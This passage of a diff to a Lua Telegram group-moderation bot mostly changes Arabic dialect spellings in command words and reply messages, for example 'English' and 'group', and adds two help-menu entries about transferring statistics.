 end
-faederdx(msg.chat_id_, msg.id_, 1,'*❅∫ عدد الجروبات الان ⌯» { '..#group..' }*'..faederddx1..''..faederddx2..'\n*❅∫ العدد الحقيقي الان ⌯» ( '..faederdx3..' ) كروب*\n', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1,'*❅∫ عدد الجروبات الان ⌯» { '..#group..' }*'..faederddx1..''..faederddx2..'\n*❅∫ العدد الحقيقي الان ⌯» ( '..faederdx3..' ) جروب*\n', 1, 'md')
 end end end,nil) end
 return false
 end
@@ -7672,13 +8802,13 @@ faederdx1:set(FAEDER..'bot:arabic:mute'..msg.chat_id_,true)
 else
 faederdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » العربيه سابقا ،', 1, 'md')
 end end
-if mutepts[2] == "الانجليزيه" then
+if mutepts[2] == "الانكليزيه" then
 if not faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
-local faeder = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الانجليزيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+local faeder = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الانكليزيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
 faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
 faederdx1:set(FAEDER..'bot:english:mute'..msg.chat_id_,true)
 else
-faederdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الانجليزيه سابقا ،', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الانكليزيه سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الملصقات" then
 if not faederdx1:get(FAEDER..'bot:sticker:mute'..msg.chat_id_) then
@@ -7935,13 +9065,13 @@ faederdx1:del(FAEDER..'bot:arabic:mute'..msg.chat_id_)
 else
 faederdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » العربيه سابقا ،', 1, 'md')
 end end
-if unmutepts[2] == "الانجليزيه" then
+if unmutepts[2] == "الانكليزيه" then
 if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
-local faeder = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الانجليزيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+local faeder = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الانكليزيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
 faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
 faederdx1:del(FAEDER..'bot:english:mute'..msg.chat_id_)
 else
-faederdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الانجليزيه سابقا ،', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الانكليزيه سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الاشعارات" then
 if faederdx1:get(FAEDER..'bot:tgservice:jk'..msg.chat_id_) then
@@ -8332,7 +9462,7 @@ local TXTAR = "❅∫ اعدادات المجموعه 🔻 :\n         • ┉ �
 .."❅∫ قفل التثبيت ، "..lock_pin.."\n"
 .."❅∫ قفل الاونلاين ، "..mute_in.."\n"
 .."❅∫ قفل العربيه ، "..lock_arabic.."\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
-.."❅∫ قفل الانجليزيه ، "..lock_english.."\n"
+.."❅∫ قفل الانكليزيه ، "..lock_english.."\n"
 .."❅∫ قفل الفارسيه ، "..mute_farsi.."\n"
 .."❅∫ قفل الماركداون ، "..markdown.."\n"
 .."️❅∫ قفل الاشعارات ، "..lock_tgservice.."\n"
@@ -8358,8 +9488,8 @@ local TXTAR = "❅∫ اعدادات المجموعه 🔻 :\n         • ┉ �
 faederdx(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
 end end 
 --     By Developer Faeder     --
-if text and text:match("^قول (.*)$")  then
-local txt = {string.match(text, "^(قول) (.*)$")}
+if text and text:match("^كول (.*)$")  then
+local txt = {string.match(text, "^(كول) (.*)$")}
 faederdx(msg.chat_id_,0, 1, txt[2], 1, 'md')
 local id = msg.id_
 local msgs = {[0] = id}
@@ -8464,7 +9594,7 @@ for x,y in pairs(result.members_) do
 changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
 x = x + 1
 end 
-faederdx(msg.chat_id_, msg.id_, 0,'❅∫ تم تنظيف قائمه حظر الكروب ', 1, 'md')
+faederdx(msg.chat_id_, msg.id_, 0,'❅∫ تم تنظيف قائمه حظر الجروب ', 1, 'md')
 end
 end
 getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
@@ -8955,7 +10085,7 @@ faederdx1:set(FAEDER..'delrep_owner'..msg.chat_id_..'',msg.content_.text_)
 return false
 end end
 text = msg.content_.text_
-if msg.content_.text_ == 'حذف رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد عام' and is_sudo(msg) then
+if msg.content_.text_ == 'حذف رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد عام' and is_sudo(msg) or msg.content_.text_ == 'مسح رد للكل' and is_sudo(msg) then
 faederdx1:set(FAEDER.."add:repallt"..msg.sender_user_id_,'del_rep1')
 faederdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمة لحذفها " ,  1, "md")
 return false
@@ -8977,7 +10107,7 @@ faederdx1:del(FAEDER.."rep_sudo",msg.content_.text_)
 return false
 end end 
 --     By Developer Faeder     -- 
-if msg.content_.text_ == 'اضف رد عام' and is_sudo(msg) or msg.content_.text_ == 'اضف رد عام' and is_sudo(msg)  then
+if msg.content_.text_ == 'اضف رد عام' and is_sudo(msg) or msg.content_.text_ == 'اضف رد للكل' and is_sudo(msg)  then
 faederdx1:set(FAEDER.."add:repallt"..msg.sender_user_id_,'set_rep')
 faederdx(msg.chat_id_, msg.id_, 1, "❅∫ حسننا ارسل الكلمه الان " ,  1, "md")
 return false    end
@@ -9231,7 +10361,7 @@ local text =  [[
 ❅∫ الماركداون
 ❅∫ العربيه
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
-❅∫ النجليزيه
+❅∫ النكليزيه
 ❅∫ الحمايه
 ❅∫ التكرار
 ❅∫ الهاشتاك
@@ -9396,7 +10526,7 @@ local text =  [[
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • 
 ❅∫ المختلف
 ❅∫ رياضيات
-❅∫ انجليزي
+❅∫ انكليزي
 ❅∫ خمن
 ❅∫ معلوماتي 
 ❅∫ القوانين 
@@ -9421,7 +10551,7 @@ local text =  [[
 ❅∫ رفع « » تنزيل مطي 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ رتبته + المعرف 
-❅∫ قول + الكلمه 
+❅∫ كول + الكلمه 
 ❅∫ هينه + المعرف 
 ❅∫ صورتي  + الرقم 
 ❅∫ الحساب + الايدي 
@@ -9507,10 +10637,10 @@ local text =  [[
 ❅∫ رفع « » تنزيل مدير
 ❅∫ رفع « » تنزيل ادمن 
 ❅∫ رفع « » تنزيل مميز 
-❅∫ رفع « » تنزيل ادمن بالكروب
-❅∫ رفع بكل الصلاحيات { بالكروب }
-❅∫ الغاء خاصيه التثبيت { بالكروب }
-❅∫ الغاء خاصيه تغيير الاسم { بالكروب } 
+❅∫ رفع « » تنزيل ادمن بالجروب
+❅∫ رفع بكل الصلاحيات { بالجروب }
+❅∫ الغاء خاصيه التثبيت { بالجروب }
+❅∫ الغاء خاصيه تغيير الاسم { بالجروب } 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ اوامر رفع المطورين 
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
@@ -9683,8 +10813,8 @@ local text =  [[
 ❅∫ تعيين امر م6
 ❅∫ تعيين امر م7
 ❅∫ تعيين امر م8
-❅∫ اضف رد عام 
-❅∫ مسح رد عام   
+❅∫ اضف رد للكل 
+❅∫ مسح رد للكل   
 ❅∫ حظر عام 
 ❅∫ كتم عام
 ❅∫ الغاء العام 
@@ -9709,11 +10839,13 @@ local text =  [[
 ❅∫ رفع النسخه ( بالرد للملف ) 
 ❅∫ جلب نسخه الجروبات 
 ❅∫ (وضع او تغيير) اسم البوت    
+❅∫ نقل احصائيات تشاكي
+❅∫ نقل احصائيات الزعيم
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ قناة الاشتراك 
 ❅∫ تعيين « » تغيير قناة الاشتراك 
-❅∫ كشف  + ايدي الكروب
-❅∫ غادر  + ايدي الكروب 
+❅∫ كشف  + ايدي الجروب
+❅∫ غادر  + ايدي الجروب 
 ❅∫ فلتر عام  + الكلمه 
 ❅∫ الغاء فلتر عام   + الكلمه 
 ❅∫ ضع ملاحظه  + الملاحظه   
